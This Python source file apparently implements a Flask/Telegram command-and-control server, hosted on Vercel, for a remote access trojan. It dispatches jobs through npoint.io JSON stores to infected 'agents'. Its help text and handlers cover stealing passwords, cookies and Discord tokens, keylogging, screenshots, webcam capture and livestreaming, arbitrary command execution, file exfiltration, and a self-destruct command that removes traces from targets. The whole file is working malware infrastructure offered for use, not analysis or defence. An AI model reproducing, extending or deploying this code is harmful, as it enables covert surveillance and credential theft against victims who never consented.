# api/index.py
# FINAL VERSION - Fully asynchronous with httpx

import os
import re
import json
import uuid
import httpx  # Replaced 'requests' with 'httpx'
import asyncio
from flask import Flask, request

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# --- Configuration ---
TOKEN = os.getenv("TELEGRAM_TOKEN")
JOBS_URL = "https://api.npoint.io/1a6a4ac391d214d100ac"
STATE_URL = "https://api.npoint.io/c2be443695998be48b75"

# Initialize Flask and Telegram Bot
app = Flask(__name__)
ptb_app = Application.builder().token(TOKEN).build()

# --- Helper Functions (Rewritten to be async) ---
def esc(text):
    return escape_markdown(str(text), version=2)

async def get_state():
    """Reads the current selected_target asynchronously."""
    async with httpx.AsyncClient() as client:
        try:
            res = await client.get(STATE_URL, timeout=5)
            res.raise_for_status()
            return res.json().get("selected_target", None)
        except Exception:
            return None

async def set_state(target_id):
    """Writes the new selected_target asynchronously."""
    async with httpx.AsyncClient() as client:
        try:
            await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
        except Exception as e:
            print(f"Error setting state: {e}")

async def post_job(target_id, command, args):
    """Posts a new command job asynchronously."""
    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
    async with httpx.AsyncClient() as client:
        try:
            try:
                res = await client.get(JOBS_URL, timeout=5)
                current_jobs = res.json()
                if not isinstance(current_jobs, list): current_jobs = []
            except Exception:
                current_jobs = []
            
            current_jobs.append(job)
            await client.post(JOBS_URL, json=current_jobs, timeout=5)
            return True
        except Exception as e:
            print(f"Error posting job: {e}")
            return False

# --- Telegram Command Handlers (Updated with 'await') ---
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "__**Vercel Controller Help**__\n\n"
        "This bot uses webhooks to post jobs for remote agents\\.\n\n"
        "__🎯 **Core Controls**__\n"
        "`/target <id|all|clear>` \\- Select which agent\\(s\\) to command\\.\n"
        "`/help` \\- Shows this help message\\.\n\n"
        "__💣 **Destructive Commands**__\n"
        "`/destroy <id> CONFIRM` \\- Removes all traces of the agent from a target\\.\n\n"
        "__🕵️ **Agent Commands (Dispatched)**__\n"
        "`/info`, `/ss`, `/cam`, `/exec <cmd>`\n"
        "`/grab <passwords|cookies|discord|all>`\n"
        "`/startkeylogger`, `/stopkeylogger`\n"
        "`/livestream`, `/stoplivestream`\n"
        "`/ls`, `/cd <dir>`, `/pwd`, `/download <path>`"
    )
    await update.message.reply_text(help_text, parse_mode='MarkdownV2')

async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_id = " ".join(context.args).lower() if context.args else None
    if not target_id:
        current_target = await get_state() or "None"
        await update.message.reply_text(f"Current target: `{esc(current_target)}`\nUsage: `/target <id|all|clear>`", parse_mode='MarkdownV2')
        return
    if target_id == 'clear':
        await set_state(None)
        await update.message.reply_text("✅ Target cleared.")
    else:
        await set_state(target_id)
        await update.message.reply_text(f"✅ Target set to: `{esc(target_id)}`")

async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: `/destroy <target_id> CONFIRM`", parse_mode='MarkdownV2')
        return
    target_id = context.args[0]
    confirmation = context.args[1] if len(context.args) > 1 else ""
    if confirmation.upper() != "CONFIRM":
        reply_text = (f"⚠️ **ARE YOU SURE?** ⚠️\n\nThis will permanently remove the agent from `{esc(target_id)}`\\. This action cannot be undone\\.\n\nTo proceed, type:\n`/destroy {esc(target_id)} CONFIRM`")
        await update.message.reply_text(reply_text, parse_mode='MarkdownV2')
        return
    if await post_job(target_id, "destroy", ""):
        await update.message.reply_text(f"✅ Self\\-destruct job dispatched to target `{esc(target_id)}`\\.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job.")

async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_target = await get_state()
    if not selected_target:
        await update.message.reply_text("❌ No target selected\\. Use `/target` first\\.", parse_mode='MarkdownV2')
        return
    command = update.message.text.split(' ')[0][1:]
    args = " ".join(context.args)
    if await post_job(selected_target, command, args):
        await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to target `{esc(selected_target)}`\\.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch job.")

# --- Register handlers ---
ptb_app.add_handler(CommandHandler("help", cmd_help))
ptb_app.add_handler(CommandHandler("target", cmd_target))
ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", "pwd", "download"]
for cmd in agent_commands:
    ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))

# --- Main Webhook Endpoint ---
async def process_update_async(update_data):
    await ptb_app.initialize()
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    await ptb_app.shutdown()

@app.route('/', methods=['POST'])
def process_webhook():
    update_data = request.get_json(force=True)
    asyncio.run(process_update_async(update_data))
    return 'OK', 200

@app.route('/', methods=['GET'])
def health_check():
    return "Vercel controller is running.", 200
